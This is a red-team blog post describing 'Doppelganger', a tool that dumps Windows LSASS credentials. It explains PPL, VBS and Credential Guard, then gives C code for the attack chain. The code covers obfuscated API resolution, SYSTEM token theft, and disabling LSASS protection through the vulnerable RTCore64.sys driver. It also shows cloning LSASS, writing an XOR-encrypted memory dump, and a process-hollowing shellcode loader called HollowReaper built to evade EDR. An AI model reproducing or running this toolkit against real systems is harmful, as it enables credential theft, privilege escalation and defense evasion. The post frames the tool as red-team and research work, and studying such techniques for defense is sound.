---
title: "Doppelganger: Cloning and Dumping LSASS to Evade Detection"
date: 2025-04-03
slug: "Doppelganger"
description: "Technique for cloning and dumping LSASS to evade detection using RTCore64.sys, NtCreateProcessEx and MiniDumpWriteDump."
keywords: ["Doppelganger", "LSASS", "RTCore64", "Red Teaming", "Detection Bypass", "Windows Security"]
draft: false
tags: ["red teaming", "windows security", "Detection bypass", "RTCore64", "LSASS"]
summary: Overview of the Doppelganger technique for dumping LSASS via cloning, featuring obfuscation and security solutions detection bypass.
toc: true
---

# Doppelganger: An Advanced LSASS Dumper with Process Cloning

## Author: vari.sh

---

![Doppelganger](/images/doppelganger.png)

## What is LSASS?

The **Local Security Authority Subsystem Service (LSASS)** is a core component of the Windows operating system, responsible for enforcing the security policy on the system. LSASS is a process that runs as `lsass.exe` and plays a fundamental role in:

- **User authentication:** It verifies users logging into the system, interacting with authentication protocols such as NTLM and Kerberos.
- **Credential management:** It handles the secure storage and retrieval of credential materials like password hashes and Kerberos tickets.
- **Token generation:** It creates access tokens used by Windows to control access rights for processes.
- **Security auditing:** It helps in generating security audit logs related to authentication and account logon events.

Because LSASS has access to sensitive data such as plaintext credentials (in some configurations), NTLM hashes, and Kerberos tickets, it has become a **high-value target** for attackers during post-exploitation. Once an attacker has administrative access on a system, dumping the memory of the LSASS process can yield credentials for other accounts, including domain administrators.

Historically, tools like Mimikatz have been used to extract credentials directly from LSASS. This has led to Microsoft and security vendors implementing increasingly aggressive protective mechanisms around LSASS, including isolating it, preventing access via protected process modes, and introducing virtualization-based protections like **Credential Guard**.

Despite these defenses, LSASS remains at the center of many offensive security strategies—making it a persistent cat-and-mouse game between attackers and defenders.

## Does Dumping LSASS Still Make Sense in 2025?

Dumping LSASS has long been a key post-exploitation technique for adversaries seeking lateral movement and privilege escalation within Windows environments. But in 2025, with modern Windows defenses and increasingly capable Endpoint Detection and Response (EDR) platforms, one might ask: **is it still worth the risk?**

The short answer is: **yes—but only if done stealthily**.

### Evolved Defenses

Microsoft has dramatically hardened LSASS in recent years:

- **Protected Process Light (PPL)**: Prevents even SYSTEM-level processes from reading LSASS memory unless signed with Microsoft-trusted certificates.
- **Virtualization-Based Security (VBS)**: Isolates security-critical components, making traditional memory dumping methods ineffective.
- **Credential Guard**: Runs part of LSASS functionality in a Hyper-V-based isolated container, making even memory-access attempts futile in many cases.
- **Tamper protection** in Microsoft Defender and EDRs: Actively monitors attempts to access or tamper with LSASS, often killing offending processes or blocking the action altogether.

### Still Relevant—With the Right Techniques

While classic methods like `procdump` or `mimikatz sekurlsa::logonpasswords` might now fail or trigger instant alerts, **attackers have adapted**:

- **Process injection and hollowing** evade static signature detection.
- **Kernel-level access using vulnerable drivers** bypasses user-mode protections.
- **Cloning LSASS** allows working on a copy instead of the protected original, avoiding direct tampering.

These techniques, when combined with **custom API resolution**, **in-memory execution**, and **encryption of artifacts**, still allow threat actors and red teamers to extract credentials from LSASS successfully—**even under PPL or VBS**.

### A Tool in the Toolbox

Modern red teamers don’t rely on LSASS dumps alone. Credential access techniques now include:

- Token impersonation and abuse of over-privileged service accounts
- Kerberoasting and AS-REP roasting
- Abuse of LSA secrets and DPAPI blobs
- Accessing cached credentials and password vaults

That said, **a successful LSASS dump still offers high-value access in a single hit**—and can lead directly to domain administrator credentials.

### Conclusion

Dumping LSASS in 2025 isn't obsolete—**it's just harder**. When performed correctly, it's still a powerful way to collect credentials, but it **requires advanced techniques** to remain undetected. This is where tools like **Doppelganger** come into play, using process cloning, obfuscation, and kernel-level manipulation to stay ahead of defensive technologies.

## PPL, VBS, and Credential Guard

To understand why dumping LSASS has become increasingly difficult, it's essential to grasp three major protection layers introduced by Microsoft: **Protected Process Light (PPL)**, **Virtualization-Based Security (VBS)**, and **Credential Guard**. These mechanisms work together to lock down access to sensitive system components—especially LSASS.

### Protected Process Light (PPL)

**PPL** is a security feature designed to protect high-value processes from tampering—even by other processes running as SYSTEM. When a process like LSASS is run as a PPL, access to its memory space is heavily restricted. Only trusted, Microsoft-signed binaries with specific protection levels can read or write to it.

PPL uses different **protection levels**, and LSASS typically runs as **PsProtectedSignerLsa-Light**. This limits access to processes that either:

- Are signed by Microsoft with a specific certificate,
- Or have the same or higher protection level.

This means that even tools running with administrative privileges (like `procdump.exe`) **cannot access LSASS** unless they're properly signed and allowed.

### Virtualization-Based Security (VBS)

**VBS** leverages hardware virtualization (e.g., Intel VT-x, AMD-V) to isolate sensitive parts of the Windows OS from the rest of the system. It creates a secure, virtualized environment called **Virtual Secure Mode (VSM)** that hosts highly privileged components.

Within VSM, certain memory regions become entirely inaccessible to standard processes—even those with elevated privileges. VBS enforces process integrity and makes it difficult to inject or tamper with system processes like LSASS.

With VBS enabled, even if an attacker disables PPL, **portions of LSASS memory may still be off-limits**.

### Credential Guard

Built on top of VBS, **Credential Guard** isolates credential material—including password hashes, Kerberos tickets, and NTLM secrets—inside VSM. LSASS still runs in the normal OS space, but the actual secrets are stored in **Isolated LSA (LSAIso)**, a process running in the secure container.

Even if you dump LSASS memory under Credential Guard, **you won't retrieve actual credentials**, just metadata or stubs pointing to secure handles.

Credential Guard also blocks:

- Direct reading of `lsass.exe` memory,
- Pass-the-hash attacks using local secrets,
- Retrieval of plaintext passwords via tools like Mimikatz.

### Why These Protections Matter

For defenders, PPL + VBS + Credential Guard form a **layered defense**:

| Protection Layer     | Goal                                            |
| -------------------- | ----------------------------------------------- |
| **PPL**              | Prevent memory access to LSASS                  |
| **VBS**              | Enforce memory isolation via virtualization     |
| **Credential Guard** | Move secrets outside attacker-accessible memory |

But for red teamers and attackers, these are **barriers to bypass**. Standard memory-dumping tools will fail. Instead, advanced techniques—like **cloning LSASS**, accessing physical memory, or using vulnerable drivers—are needed.

These mechanisms raise the bar for credential theft, but as history shows, **defense never stops exploitation—it only slows it down**.

## Doppelganger Technique Overview

**Doppelganger** is a custom-built tool designed to dump LSASS in modern, heavily defended Windows environments where traditional memory access techniques no longer work. Instead of attacking LSASS directly, Doppelganger uses an advanced strategy: **process cloning**.

By leveraging native Windows internals and carefully crafted obfuscation, Doppelganger:

- **Clones the LSASS process** using `NtCreateProcessEx`, creating a nearly identical copy of the target.
- **Avoids accessing the original LSASS** directly, which would trigger protections like PPL or Credential Guard.
- **Uses kernel-level access** via the vulnerable driver `RTCore64.sys` to temporarily remove process protections without crashing the system or triggering alarms.
- **Encrypts the resulting memory dump** with XOR encryption to minimize detection and simplify exfiltration.
- **Loads API functions dynamically and obfuscated**, preventing static detection by EDRs and sandbox analysis tools.
- **Optionally executes as in-memory shellcode**, enabling stealthy deployments.

### Why It Works

Most security solutions focus on **monitoring and protecting the LSASS process itself**. This includes:

- Hooks around `OpenProcess` and `ReadProcessMemory`.
- Kernel callbacks to detect memory access to protected processes.
- Logging and alerting when LSASS memory is dumped.

But Doppelganger **never touches the original LSASS**.

Instead, it:

1. Gains SYSTEM privileges.
2. Uses a vulnerable driver to find and unprotect LSASS in memory.
3. Clones LSASS using undocumented system calls.
4. Dumps the clone’s memory—*not the original’s*.
5. Restores protections to avoid artifacts and detection.

This method neatly sidesteps most behavioral detections, as EDRs typically don’t monitor the creation of a clone of LSASS if done properly. They also rarely inspect cloned processes for memory content unless specific YARA rules or heuristics are in place.

### Tool Philosophy

Rather than relying on publicly available tools or known techniques that can be easily fingerprinted, Doppelganger was built from scratch to:

- **Bypass modern defenses**
- **Minimize detection surfaces**
- **Give full control over every step of the process**

Its modular structure and emphasis on stealth make it a powerful utility for red team operations, malware research, or security testing scenarios where traditional dump methods simply fail.

## Project Structure

The **Doppelganger** project is built with modularity, clarity, and stealth in mind. Each module encapsulates a specific task, and the directory structure is designed to keep the core logic, utilities, and interfaces cleanly separated for easier maintenance, testing, and future extension.

Here’s the actual project layout:

```
Doppelganger
│
├───Doppelganger
│   │
│   ├───include
│   │       api.h             # API resolution logic
│   │       api_strings.h     # XOR-encrypted API names and macros
│   │       defs.h            # Common definitions, constants, macros, and XOR keys
│   │       driver.h          # Kernel memory access routines via RTCore64.sys
│   │       dump.h            # LSASS clone and dump interface
│   │       logger.h          # Logging and debug output helpers
│   │       memory.h          # Memory manipulation utilities
│   │       offsets.h         # OS-specific structure offsets (e.g., EPROCESS.Protection)
│   │       osinfo.h          # OS detection, KB parsing, build/version handling
│   │       token.h           # Privilege escalation and SYSTEM token handling
│   │       utils.h           # General-purpose helper functions
│   │
│   └───src
│           api.c             # Runtime API resolution using XOR-obfuscated names
│           driver.c          # Interfacing with RTCore64.sys for kernel R/W
│           dump.c            # Clone and dump LSASS, restore PPL protections
│           logger.c          # Minimalistic logging system
│           main.c            # Entry point for Doppelganger logic
│           memory.c          # Memory reading/writing utilities, disable and restore PPL functions
│           offsets.c         # Offset initialization for EPROCESS and other structs
│           osinfo.c          # KB scanning, PsInitialSystemProcess resolution
│           token.c           # Token impersonation and privilege manipulation
│           utils.c           # Generic helpers (string ops, hex print, etc.)
│
└───utils
        decrypt_xor_dump.py   # Decrypt XOR-encrypted LSASS dump for analysis
        HollowReaper.c        # Shellcode loader using process hollowing
        RTCore64.sys          # Signed vulnerable driver used for kernel memory access
```

### Design Philosophy

- **Separation of concerns**: Each component is dedicated to a specific responsibility. For example, `token.c` handles elevation and impersonation, while `driver.c` contains all low-level logic for talking to RTCore64.sys.
- **Extensibility**: Adding new features (e.g., support for another vulnerable driver or alternate shellcode loaders) can be done cleanly without disrupting the main workflow.
- **Stealth and clarity combined**: While the tool is designed to be stealthy and evasive, the source code remains easy to follow for those with knowledge of Windows internals.

### Highlights

- `HollowReaper.c` is an optional utility to execute Doppelganger as in-memory shellcode via process hollowing.
- `decrypt_xor_dump.py` allows analysts to decrypt and inspect the memory dump using tools like Pypykatz.
- `offsets.c/.h` dynamically select the right structure offsets for a target system, enabling compatibility with multiple Windows builds.

This structure ensures that **Doppelganger remains maintainable and portable**, while providing the low-level access and stealth necessary for red team operations in modern environments.

## How Doppelganger works

### API Resolution with Obfuscation

One of the key stealth mechanisms in **Doppelganger** is its **dynamic and obfuscated resolution of Windows APIs**. Instead of linking statically to functions like `OpenProcess`, `NtCreateProcessEx`, or `MiniDumpWriteDump`—which would be easily flagged by EDRs—the tool **resolves them at runtime using XOR-obfuscated strings**.

This technique serves multiple purposes:

- **Evades static detection** (no plaintext API names in the binary)
- **Avoids hooking** by loading clean DLLs manually
- **Reduces behavioral visibility** by delaying resolution until the function is actually needed

#### XOR-Obfuscated API Strings

API names are stored in `api_strings.h` as **byte arrays encrypted with XOR**, using a custom key (e.g., `XOR_KEY`). Here's an example for `"Process32FirstW"`:

```c
static const unsigned char P32F_ENC[] = {
    0x60, 0x43, 0x5D, 0x50, 0x51, 0x46, 0x45, 0x04, 0x0A, 0x7F, 0x08, 0x10, 0x10, 0x10, 0x32
};
```

These are decrypted at runtime using a simple XOR routine:

```c
char* xor_decrypt_string(const unsigned char* enc, size_t len, const char* key, size_t key_len) {
    char* out = malloc(len + 1);
    if (!out) return NULL;

    for (size_t i = 0; i < len; i++)
        out[i] = enc[i] ^ key[i % key_len];

    out[len] = '\0';
    return out;
}
```

#### Dynamic Resolution via CustomGetProcAddress

Once decrypted, API names are resolved using a **custom implementation of `GetProcAddress`**, which operates on **manually loaded clean DLLs** (bypassing IAT hooks introduced by security products):

```c
void* CustomGetProcAddress(HMODULE hModule, const char* name);
```

This approach avoids using the default `GetProcAddress`, which might be hooked by EDRs or monitored for specific API resolution patterns.

#### Runtime Resolution Wrapper

To encapsulate the logic, the tool uses a single function to resolve and assign APIs:

```c
BOOL ResolveApiFromDll(HMODULE hMod, const unsigned char* enc, size_t len, void** fn) {
    char* name = xor_decrypt_string(enc, len, XOR_KEY, key_len);
    if (!name) return FALSE;

    *fn = (void*)CustomGetProcAddress(hMod, name);
    free(name);
    return (*fn != NULL);
}
```

This function is used for all core Windows APIs (NTDLL, KERNEL32, ADVAPI32, etc.) and also system calls not exposed via the Windows API.

#### Clean DLL Loading

To avoid calling Windows APIs that might be hooked, Doppelganger **manually loads clean DLLs** from disk using a custom loader:

```c
HMODULE LoadCleanDLL(const char* dllName);
```

This ensures the DLL memory region is untouched by EDR hooks or user-mode callbacks, giving a more trustworthy view of function exports.

------

#### Example: Resolving `MiniDumpWriteDump`

Here’s a real-world usage snippet for resolving and using `MiniDumpWriteDump` (DbgHelp):

```c
void* pMDWD = NULL;
HMODULE hDbghelp = LoadCleanDLL("dbghelp.dll");
ResolveApiFromDll(hDbghelp, MDWD_ENC, sizeof(MDWD_ENC), &pMDWD);

// Call it later:
pMDWD(hClone, pid, NULL, MiniDumpWithFullMemory, NULL, NULL, &mci);
```

------

By combining runtime resolution, XOR obfuscation, and clean DLL loading, Doppelganger can operate **without tipping off security tools that rely on API hooking or static analysis.**

### Token Manipulation

Before accessing LSASS or interacting with protected system components, **Doppelganger must escalate its privileges**. Although it may already run as Administrator, that alone isn’t enough—**most sensitive operations require a SYSTEM-level token**.

To achieve this, Doppelganger performs **token impersonation**, borrowing the SYSTEM token from a trusted system process (typically `winlogon.exe` or `services.exe`). This technique avoids the need for User Account Control (UAC) bypass or privilege escalation exploits, and is **quiet enough to slip past most EDRs**.

#### How It Works

1. **Enumerate system processes** to find a suitable SYSTEM process (e.g., `winlogon.exe`).
2. **Open its token** with sufficient rights.
3. **Duplicate the token** using `DuplicateTokenEx`.
4. **Impersonate the token** with `SetThreadToken` or apply it directly via `ImpersonateLoggedOnUser`.

This grants Doppelganger SYSTEM-level access **without spawning a new process**, which helps avoid noisy behavior.

#### Code Snippet: SYSTEM Token Duplication

```c
HANDLE hSystemToken = NULL;

if (!GetSystemTokenAndDuplicate(&hSystemToken)) {
    log_error("Failed to duplicate SYSTEM token.");
    return 1;
}

// Use the token to impersonate SYSTEM
pIMP(hSystemToken);  // ImpersonateLoggedOnUser
pSTT(NULL, hSystemToken);  // SetThreadToken
```

The actual resolution of the APIs `ImpersonateLoggedOnUser`, `SetThreadToken`, and `DuplicateTokenEx` is handled earlier via **obfuscated API loading**, as described in the previous chapter.

#### Enabling SeDebugPrivilege

Before accessing other processes (like LSASS), the `SeDebugPrivilege` must be enabled. Doppelganger does this programmatically and stealthily, using its obfuscated privilege manipulation logic:

```c
BOOL EnableENCPVG(const char* ENC_PRIV) {
    HANDLE hProc = pGCP(); // GetCurrentProcess
    HANDLE hToken = NULL;

    DWORD flags = (0x75 ^ 0x55) | (0x5D ^ 0x55);  // TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY

    if (!pOPTK(hProc, flags, &hToken)) return FALSE;

    BOOL result = EnablePrivilege(hToken, SE_DEBUG_ENC, sizeof(SE_DEBUG_ENC));
    CloseHandle(hToken);
    return result;
}
```

This uses XOR-encrypted strings for `"SeDebugPrivilege"` and avoids suspicious privilege-enabling calls visible to many EDRs.

#### Why This Matters

Privilege escalation is a high-risk activity when done sloppily. By **borrowing a SYSTEM token from an existing process**, Doppelganger avoids:

- Creating new services
- Modifying registry keys
- Writing to privileged folders

This makes the escalation nearly invisible and sets the stage for safe interaction with LSASS—cloned or not.

### Disabling and Restoring PPL Protection

To access LSASS memory on modern Windows systems, one of the biggest obstacles is **Protected Process Light (PPL)**. Even with SYSTEM privileges, PPL prevents any process—even administrators—from reading or writing to protected processes like `lsass.exe`.

This is where **Doppelganger uses a vulnerable signed driver—`RTCore64.sys`—to directly manipulate kernel memory**, temporarily removing PPL protection from LSASS to allow safe cloning and dumping.

> **Note**: This step is entirely invisible from user-mode and bypasses all traditional Windows security checks.

------

#### Step 1: Load RTCore64.sys

`RTCore64.sys` is a **legitimately signed MSI Afterburner driver** vulnerable to arbitrary kernel memory R/W via IOCTLs. Doppelganger loads this driver via a loader.

Once the driver handle is obtained, raw memory reads and writes are done via IOCTLs.

------

#### Step 2: Locate LSASS’s EPROCESS

To remove protection, we need to locate the `EPROCESS` structure for LSASS and patch the `Protection` field. Here's how Doppelganger does it:

1. **Locate `PsInitialSystemProcess`** from a loaded copy of `ntoskrnl.exe`.
2. **Traverse the `ActiveProcessLinks` doubly-linked list** to find the process whose name is `lsass.exe`.
3. Save the address of the `EPROCESS` structure for patching.

The traversal is done fully in kernel memory, using the vulnerable driver to read arbitrary memory regions.

------

#### Step 3: Patch the Protection Field

Once the `EPROCESS` structure for LSASS is found, the tool writes `0x00` to the `Protection` fields to disable PPL:

```c
// Remove PPL from LSASS
WriteMemoryPrimitive(Device, 1, eproc + offs.Protection - 2, 0x00); // SignatureLevel
WriteMemoryPrimitive(Device, 1, eproc + offs.Protection - 1, 0x00); // SectionSignatureLevel
WriteMemoryPrimitive(Device, 1, eproc + offs.Protection, 0x00);     // Protection
```

This effectively **unprotects LSASS** for the duration of the operation, allowing duplication and dumping.

------

#### Step 4: Restore Original Protection

Once the clone is created and the dump is complete, Doppelganger **restores the original PPL values** to avoid artifacts and detection by security solutions that monitor process tampering:

```c
// Restore LSASS PPL protection
WriteMemoryPrimitive(Device, 1, SavedEproc + offs.Protection - 2, OriginalSigLv);
WriteMemoryPrimitive(Device, 1, SavedEproc + offs.Protection - 1, OriginalSecSigLv);
WriteMemoryPrimitive(Device, 1, SavedEproc + offs.Protection, OriginalProt);
```

This level of cleanup makes Doppelganger more stealthy and forensically aware than most public tools.

------

#### Why This Works

Most EDRs monitor user-mode process access and memory read APIs—but **they have no visibility into raw kernel memory writes done via signed drivers**.

By abusing a trusted driver, Doppelganger **quietly flips a few bits in memory**, clones LSASS, and flips them back—leaving minimal traces and no alerts in most monitored environments.

### Cloning LSASS

The central idea behind **Doppelganger** is simple but powerful:
 ***Instead of attacking the real LSASS process, clone it, and attack the copy.***

This approach **avoids interacting directly** with the protected `lsass.exe`, bypassing most EDR protections, logging hooks, and kernel-level security checks—because you're working with a fresh, unmonitored instance of the process.

------

#### Why Clone LSASS?

Security tools focus on monitoring access to **PID 500-ish** (`lsass.exe`).
 But a **cloned process** has:

- No PPL (unless explicitly given),
- No EDR hooks (fresh memory space),
- A new PID (so it flies under heuristic detection),
- Identical memory contents (including credentials, tokens, secrets).

By cloning LSASS, you get a **snapshot of its memory** in a process that you control.

------

#### The Tool of Choice: `NtCreateProcessEx`

Doppelganger uses the **undocumented syscall `NtCreateProcessEx`** to create a new process, using `lsass.exe` as the parent process object:

```c
NTSTATUS status = pNTCPX(
    &hClone,                    // Output: Handle to cloned process
    PROCESS_ALL_ACCESS,         // Desired access
    &objAttr,                   // Object attributes (can be NULL)
    hLsass,                     // Parent process handle (real LSASS)
    0,                          // Flags
    NULL, NULL, NULL,           // Sections (can be NULL for default clone)
    FALSE                       // Inherit handles
);
```

The result: a **new process that is a clone of LSASS**, with all of its memory copied over.

> **Note**: This is a real fork, not a new instance of `lsass.exe`. It doesn’t appear in Task Manager or usual process listings unless specifically searched.

------

#### Before Cloning: Remove PPL

Before cloning, Doppelganger uses the technique from the previous chapter to **temporarily remove PPL** from the original LSASS. Otherwise, `NtCreateProcessEx` will **fail with `STATUS_ACCESS_DENIED`** due to protection policies.

------

#### Post-Cloning: Safe Dump Target

The cloned LSASS process:

- Runs without PPL.
- Can be accessed with `OpenProcess`, `ReadProcessMemory`, or `MiniDumpWriteDump`.
- Has the **same credential data** as the original LSASS at the time of cloning.

This clone becomes the **safe, stealthy target** for dumping memory, while the original remains untouched, protected, and monitored—but irrelevant.

------

#### Bonus: Hidden from Detection

The clone is often **not registered with SCM**, doesn’t open standard handles, and doesn’t listen on network ports.
 To most monitoring tools, it’s just a **random process** with no strong indicators of compromise—especially if the dump is encrypted immediately afterward.

------

Now that we have a clean, stealthy process with all the credentials we want, it’s time to extract the goods.

### Creating and Encrypting LSASS Dump

Once Doppelganger has cloned the LSASS process, the next step is to **dump its memory** in a way that:

- Avoids detection by EDRs,
- Prevents immediate forensic analysis if the dump is discovered,
- Keeps the tool small and flexible.

To achieve this, Doppelganger uses **`MiniDumpWriteDump`** to create a full memory dump of the cloned LSASS process, and then **encrypts it in-place using XOR**.

------

#### Dumping the Cloned Process

At this point, PPL has been removed, the clone exists, and it’s fully accessible.
 Doppelganger simply calls the dump function:

```c
BOOL dumped = pMDWD(
    hClone,                 // Handle to cloned process
    clonedPID,              // Process ID
    NULL,                   // File handle (can be NULL when dumping to memory)
    MiniDumpWithFullMemory, // Dump type
    NULL, NULL, &mci        // Optional parameters. mci specifically is a callback that writes the dump in memory instead of on a file
);
```

If successful, this produces a **raw, plaintext memory dump** containing credentials, Kerberos tickets, token handles, and more.

------

#### XOR Encryption for Stealth

Rather than saving the dump directly to disk in plaintext (which would trigger alerts from Defender, EDRs, or AVs), Doppelganger **encrypts it in memory using XOR**, then writes the encrypted dump to disk.

```c
// Encrypt memory dump
xor_buffer(dumpBuffer, dumpSize, XOR_KEY, key_len);

// Write encrypted dump to disk
HANDLE hOut = CreateFileA("C:\\Users\\Public\\doppelganger.dmp", ...);
WriteFile(hOut, dumpBuffer, dumpSize, &written, NULL);
CloseHandle(hOut);
```

This ensures:

- The dump **doesn’t match known LSASS dump signatures**,
- Tools like Defender, Sysmon, or EDRs won’t detect known byte patterns (e.g., `MZ` headers, string artifacts),
- Forensic tools can’t analyze the dump unless decrypted.

------

#### Decryption and Analysis

To analyze the dump later, a simple Python script is provided (`decrypt_xor_dump.py`). It uses the same XOR key to decrypt the `.dmp` file back to a valid MiniDump:

```powershell
python decrypt_xor_dump.py C:\Windows\Public\doppelganger.dmp
```

After decryption, tools like **Pypykatz** can parse the dump normally:

```powershell
pypykatz lsa minidump doppelganger.dmp.dec
```

## Bonus: HollowReaper – Advanced Process Hollowing

**HollowReaper** is an advanced shellcode loader built to run **Doppelganger in-memory**, using a stealthy and minimal process hollowing technique.

Unlike traditional reflective loaders that tamper with the PEB or manually map PE sections, HollowReaper uses **clean API calls, direct section mapping, and RIP redirection**—a technique far less suspicious to modern EDRs.

> Instead of walking the PEB, allocating memory, writing a PE, and calling `NtUnmapViewOfSection`, we use:
>
> - `VirtualAlloc`-like behavior with `NtCreateSection`
> - Shellcode injected via shared section
> - RIP/EIP redirected using `SetThreadContext`
>
> This flow is simpler, stealthier, and avoids many typical detection triggers.

------

### High-Level Steps

1. Spawn a **suspended process**
2. Decrypt the **shellcode**
3. Create a **shared section**
4. Map shellcode to **local and remote process**
5. Modify **thread context (RIP)** to jump to shellcode
6. **Resume thread** and execute

------

### 1. Create Suspended Process

```c
wchar_t* exePathW = to_wide("C:\\Windows\\explorer.exe");

STARTUPINFOW si = { 0 };
PROCESS_INFORMATION pi = { 0 };
si.cb = sizeof(si);

if (!pCPW(exePathW, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
    printf("[!] Failed to spawn process.\n");
    return 1;
}
```

The process (e.g., `explorer.exe`, `svchost.exe`) is launched **suspended**, so we can safely modify it before it runs.

------

### 2. XOR-Deobfuscate Shellcode

Your payload (`Doppelganger.exe`) is compiled to shellcode with [Donut](https://github.com/TheWover/donut), then XOR-encrypted:

```c
unsigned char shellcode_enc[] = { 0xD8, 0xF1, 0x45, 0x33, ... };
size_t shellcode_len = sizeof(shellcode_enc);

xor_decrypt_buffer(shellcode_enc, shellcode_len, XOR_KEY, key_len);
```

------

### 3. Create Executable Section

```c
HANDLE hSection = NULL;
LARGE_INTEGER sectionSize = { 0 };
sectionSize.QuadPart = shellcode_len;

NTSTATUS status = pNCS(&hSection, SECTION_ALL_ACCESS, NULL, &sectionSize,
    PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
```

This creates a **memory section object** with RWX permissions.

------

### 4. Map Section in Both Processes

```c
// Local mapping (for writing shellcode)
PVOID localBase = NULL;
SIZE_T viewSize = 0;
pNMVOS(hSection, pGCP(), &localBase, 0, 0, NULL, &viewSize, 2, 0, PAGE_READWRITE); // NtMapViewOfSection
memcpy(localBase, shellcode_enc, shellcode_len);

// Remote mapping (for execution)
PVOID remoteBase = NULL;
viewSize = 0;
pNMVOS(hSection, pi.hProcess, &remoteBase, 0, 0, NULL, &viewSize, 2, 0, PAGE_EXECUTE_READ); // NtMapViewOfSection
```

Unlike writing memory with `WriteProcessMemory`, this technique **doesn't touch the PEB**, and it avoids setting suspicious memory protections via `VirtualProtectEx`.

------

### 5. Modify Thread Context (RIP → shellcode)

```c
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_CONTROL;
pGTC(pi.hThread, &ctx); // GetThreadContext

#ifdef _WIN64
ctx.Rip = (DWORD64)remoteBase;
#else
ctx.Eip = (DWORD)remoteBase;
#endif

// SetThreadContext
pSTC(pi.hThread, &ctx);
```

This is cleaner and stealthier than `CreateRemoteThread` or APC injection. You're just **changing where the thread resumes**.

------

### 6. Resume and Execute

```c
// ResumeThread
DWORD suspendCount = pRT(pi.hThread);
printf("[+] Shellcode executing. Suspend count: %lu\n", suspendCount);
```

The shellcode now runs inside a legitimate process, with no suspicious memory allocation, no DLL mappings, and no PE footprint.

------

### Why It’s More Stealthy

| Traditional Injectors                            | HollowReaper                        |
| ------------------------------------------------ | ----------------------------------- |
| Writes to remote memory via `WriteProcessMemory` | Uses `NtMapViewOfSection`           |
| Calls `VirtualAllocEx`, `CreateRemoteThread`     | No `VirtualAllocEx`, no new threads |
| Leaves PE metadata in memory                     | Pure shellcode                      |
| Touches or walks PEB                             | Doesn’t interact with PEB at all    |
| Often leaves IAT or suspicious regions           | Uses mapped memory and no imports   |

------

### API Obfuscation

All critical APIs are resolved **dynamically using XOR-encrypted names**, decrypted at runtime and resolved via `CustomGetProcAddress()`:

```c
char* str = xor_decrypt_string(enc, len, XOR_KEY, key_len);
void* fn = CustomGetProcAddress(hDLL, str);
```

Example of encrypted name for `CreateProcessW`:

```c
static const unsigned char CPW_ENC[] = {
    0x73, 0x43, 0x57, 0x52, 0x40, 0x50, 0x66, 0x45, 0x57, 0x5A, 0x04, 0x11, 0x10, 0x33
};
```

This ensures **zero static references** to Windows APIs.

------

### Summary

`HollowReaper` is designed for stealth and flexibility:

- Executes Doppelganger in-memory via shellcode
- Avoids common injection red flags
- Doesn’t modify the target PE or thread stacks
- Can be extended to run *any* shellcode with XOR decryption
- Ideal for red teaming, malware emulation, and EDR bypass testing

## Limitations

While **Doppelganger** is a powerful and stealthy tool for dumping LSASS memory in hardened environments, it does have some **inherent limitations** due to modern Windows security features. Understanding these limitations is crucial for setting the right expectations during red teaming, malware emulation, or security research.

------

### Credential Guard May Still Block Some Secrets

Even if LSASS is cloned successfully, **Credential Guard** isolates the most sensitive secrets—such as plaintext credentials and Kerberos TGTs—inside a secure container (`LSAIso.exe`) using **Virtualization-Based Security (VBS)**.

This means:

- The cloned LSASS may not contain all credential material.
- You might only retrieve metadata or ticket handles, not usable secrets.
- Tools like Pypykatz or Mimikatz may return empty results or partial data.

> **TL;DR**: If Credential Guard is active, even a perfect LSASS clone won't give you *everything*.

------

### Requires Vulnerable Driver (`RTCore64.sys`)

Doppelganger relies on `RTCore64.sys` for:

- Kernel memory reading/writing
- Disabling PPL on the original LSASS

This has trade-offs:

- The driver must be loaded (may require admin or SYSTEM)
- The driver is signed, but **can still be flagged by modern EDRs**
- The system must allow loading third-party drivers (e.g., no HVCI or secure boot blocking it)

> Without the driver, **PPL removal won't work**, and cloning will likely fail.

------

### Shellcode Loader Requires Donut-Compatible Payload

The **HollowReaper** loader only supports **shellcode payloads** generated by tools like Donut (`.NET`, unmanaged PE). If the payload is too large or not shellcode-safe, injection may fail.

------

### Requires OS-Specific Offsets

To locate LSASS’s `EPROCESS` and patch the `Protection` field, Doppelganger:

- Loads `ntoskrnl.exe` manually,
- Locates `PsInitialSystemProcess`,
- Walks `ActiveProcessLinks`.

The structure offsets (e.g., `EPROCESS.Protection`) vary by Windows version/build/patch level.
 The tool supports major Windows 10/11 builds, but **might need updates** for newer KBs.

------

### Still Requires SYSTEM Privileges

Even though Doppelganger avoids direct tampering with LSASS:

- It must impersonate or elevate to SYSTEM,
- And load a kernel driver (which generally needs Admin or SYSTEM).

If you're running as a low-privileged user, **you're not getting far**.

------

### Dump Still Lands on Disk (Unless Modified)

By default, Doppelganger writes the XOR-encrypted dump to a file (e.g., `C:\Users\Public\doppelganger.dmp`).
 While encrypted, it's still a **physical artifact** that can be picked up by:

- File integrity monitors
- Forensics tools
- Disk scanners

You can modify the tool to return the dump in-memory or exfiltrate it via C2, but that’s up to the operator.

------

### Not a Silver Bullet

- Some EDRs monitor **`NtCreateProcessEx`**
- Others detect **unusual threads modifying their own RIP**
- Kernel tampering via known drivers might raise red flags

Doppelganger reduces detection **significantly**, but **it’s not undetectable**.
 A well-tuned EDR with behavioral heuristics and kernel monitoring **may still catch you**.

------

## TL;DR

| Limitation               | Impact                               |
| ------------------------ | ------------------------------------ |
| Credential Guard active  | Partial/no credential extraction     |
| Requires RTCore64.sys    | Needs driver load capability         |
| SYSTEM privileges needed | Can’t run as low-priv user           |
| OS-specific offsets      | May need updates for new builds      |
| Dump written to disk     | Leaves artifact (unless modified)    |
| Not bulletproof          | May still be caught by advanced EDRs |

## Conclusion

**Doppelganger** is a modern, stealthy, and modular utility designed to dump LSASS in 2025—when traditional techniques are blocked by PPL, VBS, Credential Guard, and aggressive EDRs.

Rather than fighting directly with the protected LSASS process, Doppelganger takes a smarter approach:

- **Cloning** LSASS with `NtCreateProcessEx`
- **Disabling PPL** temporarily via direct kernel memory writes using a signed vulnerable driver
- **Avoiding static detection** through XOR-obfuscated API resolution and runtime decryption
- **Dumping memory silently**, and encrypting it to avoid forensics
- **Optional in-memory execution** via HollowReaper’s clean, evasive process hollowing routine

This combination of **low-level Windows internals, stealthy loader design, and modular architecture** makes Doppelganger a powerful asset for red team operations, evasion research, and offensive tooling development.

That said, it’s not a magic bullet. Modern Windows security features like **Credential Guard** and behavioral detection systems still pose challenges. But when used appropriately, Doppelganger offers a path around many of the roadblocks defenders rely on today.

------

## Disclaimer

